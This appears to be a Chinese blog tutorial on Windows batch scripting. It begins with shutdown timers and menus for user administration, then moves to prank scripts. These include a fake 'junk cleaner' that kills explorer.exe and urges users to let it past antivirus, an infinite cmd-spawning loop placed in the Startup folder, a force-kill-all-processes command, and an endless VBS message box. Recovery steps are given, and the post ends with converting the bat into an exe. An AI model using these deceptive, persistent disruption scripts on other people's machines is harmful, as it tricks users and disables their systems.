      <link href="/2022/06/10/Windows/%E6%89%B9%E5%A4%84%E7%90%86/"/>
      <url>/2022/06/10/Windows/%E6%89%B9%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="1-bat批处理"><a href="#1-bat批处理" class="headerlink" title="1.bat批处理"></a>1.bat批处理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows里面的脚本，它可以自动批量运行脚本里面多个指令</span><br><span class="line">批处理的作用：</span><br><span class="line">自上而下成批的处理每一条指令，直到执行到最后一条</span><br><span class="line">过程：</span><br><span class="line">创建一个记事本.txt，把扩展名改为.bat</span><br><span class="line">注意：要把文件的后缀名显示出来</span><br><span class="line">echo  %userprofile%  当前用户</span><br></pre></td></tr></table></figure><h5 id="（1）批量删除文件："><a href="#（1）批量删除文件：" class="headerlink" title="（1）批量删除文件："></a>（1）批量删除文件：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off 无显示过程</span><br><span class="line">d:</span><br><span class="line">cd \</span><br><span class="line">cd test</span><br><span class="line">del * /s /q &gt;nul 不显示结果</span><br><span class="line">pause      暂停命令</span><br></pre></td></tr></table></figure><h5 id="（2）定时关机"><a href="#（2）定时关机" class="headerlink" title="（2）定时关机"></a>（2）定时关机</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">title 九头蛇</span><br><span class="line">color c2</span><br><span class="line">echo ========================</span><br><span class="line">echo.//换行</span><br><span class="line">echo 欢迎使用定时关机小程序</span><br><span class="line">echo.</span><br><span class="line">echo ========================</span><br><span class="line">set /p time=请输入时间：         //设置变量</span><br><span class="line">shutdown -s -t %time%</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><h5 id="（3）多项处理"><a href="#（3）多项处理" class="headerlink" title="（3）多项处理"></a>（3）多项处理</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">title 九头蛇</span><br><span class="line">color c2</span><br><span class="line">：menu</span><br><span class="line">cls</span><br><span class="line">echo ========================</span><br><span class="line">echo.</span><br><span class="line">echo         菜单</span><br><span class="line">echo       1.定时关机</span><br><span class="line">echo       2.查看ip</span><br><span class="line">echo       3.取消关机任务</span><br><span class="line">echo       4.退出</span><br><span class="line">echo.</span><br><span class="line">echo ========================</span><br><span class="line">set /p num=请输入选项：         </span><br><span class="line">if &quot;%num%&quot;==&quot;1&quot; goto a</span><br><span class="line">if &quot;%num%&quot;==&quot;2&quot; goto b</span><br><span class="line">if &quot;%num%&quot;==&quot;3&quot; goto c</span><br><span class="line">if &quot;%num%&quot;==&quot;4&quot; goto d</span><br><span class="line"></span><br><span class="line">:a</span><br><span class="line">set /p time = 请输入时间</span><br><span class="line">shutdown -s -t %time%</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:b</span><br><span class="line">ipconfig</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:c</span><br><span class="line">shutdown -a</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:d</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/e00d247a451f4283b027cf04528b6707.png" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（2）；练习2</span><br><span class="line">@echo off</span><br><span class="line">title 九头蛇</span><br><span class="line">color 70</span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo ===============================</span><br><span class="line">echo.</span><br><span class="line">echo            菜单</span><br><span class="line">echo       1.查看隐藏文件</span><br><span class="line">echo       2.创建一个属于自己的文件</span><br><span class="line">echo       3.删除文件</span><br><span class="line">echo       4.查看文件内容</span><br><span class="line">echo       5.增加用户</span><br><span class="line">echo       6.用户固定时间内运行</span><br><span class="line">echo       7.停用帐户</span><br><span class="line">echo       8.端口查看</span><br><span class="line">echo       9.查看机器的详细信息</span><br><span class="line">echo       10.退出</span><br><span class="line">echo.</span><br><span class="line">echo ===============================</span><br><span class="line">set /p num=请输入选项</span><br><span class="line">if &quot;%num%&quot;==&quot;1&quot; goto a</span><br><span class="line">if &quot;%num%&quot;==&quot;2&quot; goto b</span><br><span class="line">if &quot;%num%&quot;==&quot;3&quot; goto c</span><br><span class="line">if &quot;%num%&quot;==&quot;4&quot; goto d</span><br><span class="line">if &quot;%num%&quot;==&quot;5&quot; goto e</span><br><span class="line">if &quot;%num%&quot;==&quot;6&quot; goto f</span><br><span class="line">if &quot;%num%&quot;==&quot;7&quot; goto g</span><br><span class="line">if &quot;%num%&quot;==&quot;8&quot; goto h</span><br><span class="line">if &quot;%num%&quot;==&quot;9&quot; goto i</span><br><span class="line">if &quot;%num%&quot;==&quot;10&quot; goto j</span><br><span class="line"></span><br><span class="line">:a</span><br><span class="line">dir /a</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:b</span><br><span class="line">set /p wenjianming=请输入文件名</span><br><span class="line">md %wenjianming%</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:c</span><br><span class="line">set /p wenjianming=请输入文件名</span><br><span class="line">rd %wenjianming%</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:d</span><br><span class="line">set /p wenjianming=请输入文件名</span><br><span class="line">type %wenjianming%</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:e</span><br><span class="line">set /p username=请输入用户名</span><br><span class="line">set /p password=请输入密码</span><br><span class="line">net user %username% %password% /add</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:f</span><br><span class="line">set /p username=请输入用户名</span><br><span class="line">set /p xingqi=请输入星期</span><br><span class="line">set /p shijian=请输入时间</span><br><span class="line">net user %username% /times:%xingqi%,%shijian%</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:g</span><br><span class="line">set /p username=请输入用户名</span><br><span class="line">net user %username% /active:no</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:h</span><br><span class="line">netstat -ano</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:i</span><br><span class="line">systemimfo</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:j</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h5 id="4-其余操作"><a href="#4-其余操作" class="headerlink" title="(4)其余操作"></a>(4)其余操作</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.start cmd %0    无限弹出窗口</span><br><span class="line">2.taskkill /f /fi &quot;pid ne 1&quot;  /f:强制  /fi: 过滤</span><br></pre></td></tr></table></figure><h5 id="（5）系统垃圾清理"><a href="#（5）系统垃圾清理" class="headerlink" title="（5）系统垃圾清理"></a>（5）系统垃圾清理</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.代码：</span><br><span class="line">@echo off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line">echo ==========若有杀毒软件恶意拦截，请选择允许程序的所有操作=========</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">echo=============垃圾正在清理中，请不要关闭窗口============</span><br><span class="line">echo.</span><br><span class="line">echo 5</span><br><span class="line">ping -n 2 127.0.0.1&gt;nul</span><br><span class="line">echo 4</span><br><span class="line">ping -n 2 127.0.0.1&gt;nul</span><br><span class="line">echo 3</span><br><span class="line">ping -n 2 127.0.0.1&gt;nul</span><br><span class="line">echo 2</span><br><span class="line">ping -n 2 127.0.0.1&gt;nul</span><br><span class="line">echo 1</span><br><span class="line">taskkill /im explorer.exe /f&gt;nul    </span><br><span class="line">echo=============完犊子了，你的系统已经废了===============</span><br><span class="line">ping -n 7 127.0.0.1&gt;nul</span><br><span class="line">echo.</span><br><span class="line">start C:\Windows\explorer.exe</span><br><span class="line">echo==================已经修复好了==============</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.解决办法</span><br><span class="line">  (1)按组合键Ctrl+Alt+Delete,打开任务管理器</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/f884427c212d46f6afd5baee8ddfc43e.png" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（2）新建任务</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/d351e179522843e29424f43a96cf0ec2.png" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（3）在windows下浏览explorer.exe</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/26b56f73ebf44dab87a729c4d3938a2c.png" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(4)运行此任务，即可恢复</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/8bac5bd85477440abfa57497e44546ea.png" alt="在这里插入图片描述"></p><h5 id="（6）重启无限弹出窗口"><a href="#（6）重启无限弹出窗口" class="headerlink" title="（6）重启无限弹出窗口"></a>（6）重启无限弹出窗口</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.将文件移动到启动项里面</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/912dba6d51d84d70a475a7cc862bee82.png" alt="在这里插入图片描述"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/ef9684c2aefe4cb8aebc08ca2c3f668b.png" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.代码：</span><br><span class="line">@echo off</span><br><span class="line">color 2f</span><br><span class="line">echo start cmd &gt;C:\Windows\windows.bat</span><br><span class="line">echo %%0 &gt;&gt;C:\Windows\windows.bat</span><br><span class="line">copy C:\Windows\windows.bat &quot;%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&quot;&gt;nul</span><br><span class="line">pause</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="（7）vbs"><a href="#（7）vbs" class="headerlink" title="（7）vbs"></a>（7）vbs</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.代码：</span><br><span class="line">do</span><br><span class="line">msgbox &quot;gxx&quot;</span><br><span class="line">loop</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.解决办法：</span><br><span class="line">在任务管理器中，结束wscript.exe </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/3aa05a954591486baa17fba1e1626ced.png" alt="在这里插入图片描述"></p><h5 id="（8）html"><a href="#（8）html" class="headerlink" title="（8）html"></a>（8）html</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>整人代码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;zc&#x27;)&quot;</span>&gt;</span>baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="（9）bat转换exe程序"><a href="#（9）bat转换exe程序" class="headerlink" title="（9）bat转换exe程序"></a>（9）bat转换exe程序</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.将文件拖入</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/54a23cd73857419f9e0a7788acacf807.png" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.选择加载图标</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/ab0f1be2eb7941eaa285f4adf3d40089.png" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.build输出</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/54d98442638f48f79384e8622dd052bb.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
